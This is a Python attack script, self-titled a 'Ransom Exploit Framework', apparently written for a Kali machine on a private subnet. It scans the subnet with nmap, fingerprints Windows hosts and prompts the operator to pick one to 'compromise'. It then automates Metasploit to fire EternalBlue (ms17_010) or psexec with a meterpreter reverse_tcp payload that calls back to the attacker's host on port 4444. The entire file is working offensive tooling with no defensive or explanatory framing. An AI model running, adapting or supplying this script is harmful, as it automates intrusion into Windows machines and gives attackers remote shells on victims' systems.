#!/usr/bin/python3

import subprocess
import pexpect
import os
import sys

print("Script starting...")

# IP of this Kali machine
my_ip = "192.168.50.102"

# IPs to ignore
ignore_list = [
    '192.168.50.1', '192.168.50.6', '192.168.50.37', '192.168.50.58',
    '192.168.50.70', '192.168.50.78', '192.168.50.100', '192.168.50.109',
    '192.168.50.164', '192.168.50.181', '192.168.50.184', '192.168.50.240',
    '192.168.50.241', '192.168.50.9', '192.168.50.144', '192.168.50.102',
    '192.168.50.155', '192.168.50.149', '192.168.50.234'
]

# Subnet range
subnet_range = "/24"

def check_dependencies():
    """Check if required tools are available"""
    print("Checking dependencies...")
    try:
        subprocess.run(["which", "nmap"], check=True, capture_output=True)
        subprocess.run(["which", "msfconsole"], check=True, capture_output=True)
        print("[+] Dependencies check passed")
        return True
    except subprocess.CalledProcessError:
        print("[!] Missing required tools. Please install nmap and metasploit-framework")
        return False

def main():
    print("\n[+] Ransom Exploit Framework Starting...")
    
    # Check dependencies
    if not check_dependencies():
        print("Dependencies failed, exiting...")
        sys.exit(1)
    
    try:
        # Nmap host discovery
        print("\n[+] Scanning local network...")
        scan_result = subprocess.run(["sudo", "nmap", "-sn", "192.168.50.0" + subnet_range],
                                     capture_output=True, text=True, check=True, timeout=120)

        print(f"Scan completed. Output length: {len(scan_result.stdout)}")

        # Extract live IPs
        ip_list = []
        for line in scan_result.stdout.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split()[-1].strip("()")
                ip_list.append(ip)

        print(f"Found {len(ip_list)} total IPs")

        # Clean the list
        cleaned_list = [ip for ip in ip_list if ip.count('.') == 3 and ip not in ignore_list]
        print("\n[+] IP Addresses found on network (filtered):")
        print(cleaned_list)

        if not cleaned_list:
            print("\n[!] No targets found. Exiting.")
            sys.exit(1)

        # Identify Windows hosts
        windows_hosts = {}
        for ip in cleaned_list:
            print(f"\n[+] Running service scan for: {ip}")
            try:
                sv_scan = subprocess.run(["sudo", "nmap", "-sV", ip], 
                                       capture_output=True, text=True, timeout=60)
                if "Windows" in sv_scan.stdout:
                    windows_hosts[ip] = sv_scan.stdout
                    print(f"[+] Windows host detected: {ip}")
            except subprocess.TimeoutExpired:
                print(f"[!] Timeout scanning {ip}")
                continue
            except subprocess.CalledProcessError as e:
                print(f"[!] Error scanning {ip}: {e}")
                continue

        # Show discovered Windows hosts
        print("\n[+] Windows Hosts Identified:")
        windows_ips = list(windows_hosts.keys())
        for i, ip in enumerate(windows_ips):
            print(f"{i+1}. {ip}")

        if not windows_ips:
            print("\n[!] No Windows hosts found. Exiting.")
            sys.exit(1)

        # User selects a target
        while True:
            try:
                user_choice = int(input("\nEnter the number of the IP you want to compromise: ")) - 1
                if 0 <= user_choice < len(windows_ips):
                    target_ip = windows_ips[user_choice]
                    print(f"\n[+] Target selected: {target_ip}")
                    break
                else:
                    print("[!] Invalid selection. Please choose a valid number.")
            except ValueError:
                print("[!] Please enter a valid number.")
            except KeyboardInterrupt:
                print("\n[!] Script interrupted by user.")
                sys.exit(1)

        # Exploit menu
        print("\nSelect exploit to use:")
        exploits = {
            "1": "exploit/windows/smb/ms17_010_eternalblue",
            "2": "exploit/windows/smb/psexec"
        }
        for key, val in exploits.items():
            print(f"{key}. {val}")

        while True:
            try:
                exploit_choice = input("Enter exploit number: ")
                if exploit_choice in exploits:
                    chosen_exploit = exploits[exploit_choice]
                    print(f"[+] Selected exploit: {chosen_exploit}")
                    break
                else:
                    print("[!] Invalid choice. Please select 1 or 2.")
            except KeyboardInterrupt:
                print("\n[!] Script interrupted by user.")
                sys.exit(1)

        # Set payload details
        lport = "4444"
        payload = "windows/x64/meterpreter/reverse_tcp"

        # Launch Metasploit via pexpect
        print("\n[+] Launching Metasploit and setting up exploit...\n")

        try:
            msf = pexpect.spawn("msfconsole", encoding='utf-8', timeout=300)
            msf.expect("msf6 >", timeout=60)

            msf.sendline(f"use {chosen_exploit}")
            msf.expect("msf6 exploit", timeout=30)

            msf.sendline(f"set RHOSTS {target_ip}")
            msf.expect("msf6 exploit", timeout=10)
            
            msf.sendline(f"set LHOST {my_ip}")
            msf.expect("msf6 exploit", timeout=10)
            
            msf.sendline(f"set LPORT {lport}")
            msf.expect("msf6 exploit", timeout=10)
            
            msf.sendline(f"set PAYLOAD {payload}")
            msf.expect("msf6 exploit", timeout=10)
            
            print("[+] Configuration complete. Launching exploit...")
            msf.sendline("run")

            print("\n[!] Exploit launched — Metasploit is now active.")
            print("[+] Use Ctrl+C to exit when done.")
            msf.interact()

        except pexpect.TIMEOUT:
            print("\n[!] Metasploit timeout. Check if msfconsole is working properly.")
            sys.exit(1)
        except pexpect.EOF:
            print("\n[!] Metasploit session ended unexpectedly.")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"\n[!] Command failed: {e}")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("\n[!] Network scan timeout. Check network connectivity.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("Calling main function...")
    main()
    print("Main function completed.")
